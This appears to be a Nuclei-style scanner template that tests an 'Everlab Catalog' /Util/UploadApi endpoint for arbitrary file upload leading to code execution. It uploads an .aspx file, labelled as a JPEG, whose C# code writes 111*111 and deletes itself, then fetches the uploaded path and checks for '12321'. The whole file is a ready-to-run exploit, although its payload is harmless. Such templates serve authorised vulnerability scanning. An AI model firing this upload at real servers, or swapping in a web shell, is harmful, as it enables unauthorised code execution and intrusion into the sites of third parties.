id: Everlab-Catalog-UploadApi-upload

info:
  name: Everlab-Catalog-UploadApi-upload
  author: Everlab-Catalog-UploadApi-upload
  severity: critical

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{rand_text_numeric(28)}}"

requests:
  - raw:
      - |
        POST /Util/UploadApi HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}
        Origin: null
        Connection: clos
        Upgrade-Insecure-Requests: 1

        -----------------------------{{boundary}}
        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.aspx"
        Content-Type: image/jpeg

        <%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
        -----------------------------{{boundary}}--

      - |
        @timeout: 10
        GET {{pathname}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
    

    extractors:
      - type: json
        part: body_1
        name: pathname
        internal: true
        json:
          - .Results

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body_1,"{{filename}}") && contains_all(body_2,"12321")'